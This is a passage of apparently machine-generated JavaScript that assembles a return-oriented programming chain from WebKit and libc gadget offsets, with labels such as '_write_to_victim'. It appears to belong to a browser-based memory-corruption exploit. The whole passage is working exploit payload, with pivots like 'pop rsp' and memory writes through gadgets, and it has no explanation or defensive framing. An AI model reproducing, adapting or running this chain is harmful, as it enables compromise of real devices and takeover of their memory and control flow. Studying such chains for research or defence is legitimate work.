set_gadget(libc_base+165442,);
//L6426:
db([0,0]);
set_gadget(libc_base+768796,);
//L6427:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+346144,//L6428+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+346136,//L6428
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L6428:
db([0,0]);
set_gadgets([
ropchain+346160,//L6428+24
ropchain+346176,//L6423
libc_base+489696,//pop rsp
ropchain+346192,//L6429
//L6423:
libc_base+489696,//pop rsp
ropchain+349280,//L6430
//L6429:
libc_base+768796
]);
//L6431:
db([20,0]);// 0x14
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6432:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6433:
db([46,0]);// 0x2e
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6434:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+346440,//L6437
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6435:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6437:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+346528,//L6439
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+346544,//L6440
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6439:
db([0,0]);
set_gadget(libc_base+772328,);
//L6440:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+346688,//L6443
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+346704,//L6444
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+346672,//L6442
webkit_base+4687784,
libc_base+713278
]);
//L6441:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L6442:
db([0,0]);
set_gadget(libc_base+772328,);
//L6443:
db([0,0]);
set_gadget(libc_base+768796,);
//L6444:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+346792,//L6446
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+346808,//L6447
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6446:
db([0,0]);
set_gadget(libc_base+772328,);
//L6447:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+346952,//L6450
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+346920,//L6448
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+346936,//L6449
webkit_base+4687784,
libc_base+165442
]);
//L6448:
db([0,0]);
set_gadget(libc_base+772328,);
//L6449:
db([0,0]);
set_gadget(libc_base+768796,);
//L6450:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+347024,//L6452
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6452:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+347080,//L6454
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6454:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+347176,//L6457
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6455:
db([4294967272,4294967295]);// -0x18
set_gadget(libc_base+772328,);
//L6457:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+347264,//L6459
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+347280,//L6460
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6459:
db([0,0]);
set_gadget(libc_base+772328,);
//L6460:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+347440,//L6462
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+347472,//L6464
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+347424,//L6461
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+347456,//L6463
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6461:
db([0,0]);
set_gadget(libc_base+165442,);
//L6462:
db([0,0]);
set_gadget(libc_base+772328,);
//L6463:
db([0,0]);
set_gadget(libc_base+768796,);
//L6464:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+347632,//L6468
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+347584,//L6465
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+347600,//L6466
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6465:
db([0,0]);
set_gadget(libc_base+165442,);
//L6466:
db([0,0]);
set_gadget(libc_base+772328,);
//L6467:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L6468:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+347712,//L6469
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+347728,//L6470
webkit_base+4687784,
libc_base+772328
]);
//L6469:
db([0,0]);
set_gadget(libc_base+768796,);
//L6470:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+347816,//L6472
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6472:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+347872,//L6474
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6474:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+348000,//L6475
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+348032,//L6477
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+348016,//L6476
webkit_base+4687784,
libc_base+165442
]);
//L6475:
db([0,0]);
set_gadget(libc_base+772328,);
//L6476:
db([0,0]);
set_gadget(libc_base+768796,);
//L6477:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+348192,//L6479
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+348224,//L6481
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+348176,//L6478
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+348208,//L6480
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6478:
db([0,0]);
set_gadget(libc_base+165442,);
//L6479:
db([0,0]);
set_gadget(libc_base+772328,);
//L6480:
db([0,0]);
set_gadget(libc_base+768796,);
//L6481:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+348304,//L6482
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+348320,//L6483
webkit_base+4687784,
libc_base+165442
]);
//L6482:
db([0,0]);
set_gadget(libc_base+768796,);
//L6483:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+348416,//L6485
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+348400,//L6484
webkit_base+4687784,
libc_base+165442
]);
//L6484:
db([0,0]);
set_gadget(libc_base+768796,);
//L6485:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6487:
ropchain+348520,//L6486
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+358624,//L6488
//L6486:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
//L6489:
libc_base+713278,
ropchain+348608,//L6492
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6490:
db([4294967272,4294967295]);// -0x18
set_gadget(libc_base+772328,);
//L6492:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+348696,//L6494
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+348712,//L6495
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6494:
db([0,0]);
set_gadget(libc_base+772328,);
//L6495:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+348872,//L6497
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+348904,//L6499
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+348856,//L6496
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+348888,//L6498
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6496:
db([0,0]);
set_gadget(libc_base+165442,);
//L6497:
db([0,0]);
set_gadget(libc_base+772328,);
//L6498:
db([0,0]);
set_gadget(libc_base+768796,);
//L6499:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+349000,//L6501
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+348984,//L6500
webkit_base+4687784,
libc_base+165442
]);
//L6500:
db([0,0]);
set_gadget(libc_base+768796,);
//L6501:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+349088,//L6503
webkit_base+4687784,
libc_base+713278
]);
//L6502:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L6503:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+349160,//L6506
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6504:
db([4294967272,4294967295]);// -0x18
set_gadget(libc_base+772328,);
//L6506:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+349224,//L6508
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6508:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+344880,//L6397
//L6430:
libc_base+713278,
ropchain+349336,//L6511
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6509:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L6511:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+349424,//L6513
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+349440,//L6514
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6513:
db([0,0]);
set_gadget(libc_base+772328,);
//L6514:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+349584,//L6517
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+349552,//L6515
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+349568,//L6516
webkit_base+4687784,
libc_base+165442
]);
//L6515:
db([0,0]);
set_gadget(libc_base+772328,);
//L6516:
db([0,0]);
set_gadget(libc_base+768796,);
//L6517:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
//L6518:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L6519:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6520:
db([0,0]);
set_gadget(libc_base+772328,);
//L6521:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+349832,//L6522
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+349848,//L6523
webkit_base+4687784,
libc_base+772328
]);
//L6522:
db([0,0]);
set_gadget(libc_base+768796,);
//L6523:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+349984,//L6526
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6524:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6526:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+350072,//L6528
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+350088,//L6529
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6528:
db([0,0]);
set_gadget(libc_base+772328,);
//L6529:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+350232,//L6532
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+350200,//L6530
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+350216,//L6531
webkit_base+4687784,
libc_base+165442
]);
//L6530:
db([0,0]);
set_gadget(libc_base+772328,);
//L6531:
db([0,0]);
set_gadget(libc_base+768796,);
//L6532:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6534:
ropchain+350336,//L6533
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+339256,//_write_to_victim
//L6533:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6535:
db([4294967268,4294967295]);// -0x1c
set_gadget(libc_base+772328,);
//L6537:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+350464,//L6539
webkit_base+4687784,
libc_base+772328
]);
//L6538:
db([0,0]);
set_gadget(libc_base+768796,);
//L6539:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+350520,//L6542
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6542:
db([0,0]);
//L6540:
set_gadgets([
libc_base+713278,
ropchain+350584,//L6545
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6543:
db([4294967268,4294967295]);// -0x1c
set_gadget(libc_base+772328,);
//L6545:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+350672,//L6547
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+350688,//L6548
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6547:
db([0,0]);
set_gadget(libc_base+772328,);
//L6548:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+350848,//L6550
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+350880,//L6552
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+350832,//L6549
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+350864,//L6551
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6549:
db([0,0]);
set_gadget(libc_base+165442,);
//L6550:
db([0,0]);
set_gadget(libc_base+772328,);
//L6551:
db([0,0]);
set_gadget(libc_base+768796,);
//L6552:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+350960,//L6553
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+350976,//L6554
webkit_base+4687784,
libc_base+165442
]);
//L6553:
db([0,0]);
set_gadget(libc_base+768796,);
//L6554:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+351072,//L6556
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+351056,//L6555
webkit_base+4687784,
libc_base+165442
]);
//L6555:
db([0,0]);
set_gadget(libc_base+768796,);
//L6556:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+351168,//L6558
webkit_base+4687784,
libc_base+768796
]);
//L6557:
db([512,0]);// 0x200
set_gadget(webkit_base+3789839,);//pop r11
//L6558:
db([0,0]);
set_gadget(libc_base+165442,);
//L6559:
db([512,0]);// 0x200
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+351312,//L6561
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+351328,//L6562
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+351296,//L6560
webkit_base+4687784,
libc_base+165442
]);
//L6560:
db([0,0]);
set_gadget(libc_base+772328,);
//L6561:
db([0,0]);
set_gadget(libc_base+768796,);
//L6562:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+351504,//L6564
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+351520,//L6565
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+351488,//L6563
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6563:
db([0,0]);
set_gadget(libc_base+165442,);
//L6564:
db([0,0]);
set_gadget(libc_base+768796,);
//L6565:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+351648,//L6568
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+351680,//L6570
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+351664,//L6569
webkit_base+4687784,
libc_base+713278
]);
//L6567:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L6568:
db([0,0]);
set_gadget(libc_base+165442,);
//L6569:
db([0,0]);
set_gadget(libc_base+768796,);
//L6570:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+351792,//L6571+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+351784,//L6571
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L6571:
db([0,0]);
set_gadgets([
ropchain+351808,//L6571+24
ropchain+351824,//L6566
libc_base+489696,//pop rsp
ropchain+351840,//L6572
//L6566:
libc_base+489696,//pop rsp
ropchain+357656,//L6573
//L6572:
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+351896,//L6575
webkit_base+4687784,
libc_base+768796
]);
//L6574:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L6575:
db([0,0]);
set_gadget(libc_base+165442,);
//L6576:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+352008,//L6578
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+351992,//L6577
webkit_base+4687784,
libc_base+165442
]);
//L6577:
db([0,0]);
set_gadget(libc_base+768796,);
//L6578:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+352104,//L6580
webkit_base+4687784,
libc_base+713278
]);
//L6579:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6580:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+352160,//L6582
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6582:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+352216,//L6584
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6584:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+352320,//L6586
webkit_base+4687784,
libc_base+713278
]);
//L6585:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6586:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+352424,//L6589
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6587:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6589:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+352512,//L6591
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+352528,//L6592
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6591:
db([0,0]);
set_gadget(libc_base+772328,);
//L6592:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+352672,//L6595
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+352688,//L6596
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+352656,//L6594
webkit_base+4687784,
libc_base+713278
]);
//L6593:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L6594:
db([0,0]);
set_gadget(libc_base+772328,);
//L6595:
db([0,0]);
set_gadget(libc_base+768796,);
//L6596:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+352776,//L6598
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+352792,//L6599
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6598:
db([0,0]);
set_gadget(libc_base+772328,);
//L6599:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+352936,//L6602
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+352904,//L6600
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+352920,//L6601
webkit_base+4687784,
libc_base+165442
]);
//L6600:
db([0,0]);
set_gadget(libc_base+772328,);
//L6601:
db([0,0]);
set_gadget(libc_base+768796,);
//L6602:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+353008,//L6604
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6604:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+353064,//L6606
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6606:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+353160,//L6609
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6607:
db([4294967268,4294967295]);// -0x1c
set_gadget(libc_base+772328,);
//L6609:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+353248,//L6611
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+353264,//L6612
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6611:
db([0,0]);
set_gadget(libc_base+772328,);
//L6612:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+353424,//L6614
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+353456,//L6616
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+353408,//L6613
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+353440,//L6615
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6613:
db([0,0]);
set_gadget(libc_base+165442,);
//L6614:
db([0,0]);
set_gadget(libc_base+772328,);
//L6615:
db([0,0]);
set_gadget(libc_base+768796,);
//L6616:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+353616,//L6620
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+353568,//L6617
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+353584,//L6618
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6617:
db([0,0]);
set_gadget(libc_base+165442,);
//L6618:
db([0,0]);
set_gadget(libc_base+772328,);
//L6619:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L6620:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+353696,//L6621
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+353712,//L6622
webkit_base+4687784,
libc_base+772328
]);
//L6621:
db([0,0]);
set_gadget(libc_base+768796,);
//L6622:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+353800,//L6624
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6624:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+353856,//L6626
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6626:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+353984,//L6627
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+354016,//L6629
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+354000,//L6628
webkit_base+4687784,
libc_base+165442
]);
//L6627:
db([0,0]);
set_gadget(libc_base+772328,);
//L6628:
db([0,0]);
set_gadget(libc_base+768796,);
//L6629:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+354176,//L6631
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+354208,//L6633
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+354160,//L6630
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+354192,//L6632
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6630:
db([0,0]);
set_gadget(libc_base+165442,);
//L6631:
db([0,0]);
set_gadget(libc_base+772328,);
//L6632:
db([0,0]);
set_gadget(libc_base+768796,);
//L6633:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+354288,//L6634
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+354304,//L6635
webkit_base+4687784,
libc_base+165442
]);
//L6634:
db([0,0]);
set_gadget(libc_base+768796,);
//L6635:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+354400,//L6637
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+354384,//L6636
webkit_base+4687784,
libc_base+165442
]);
//L6636:
db([0,0]);
set_gadget(libc_base+768796,);
//L6637:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
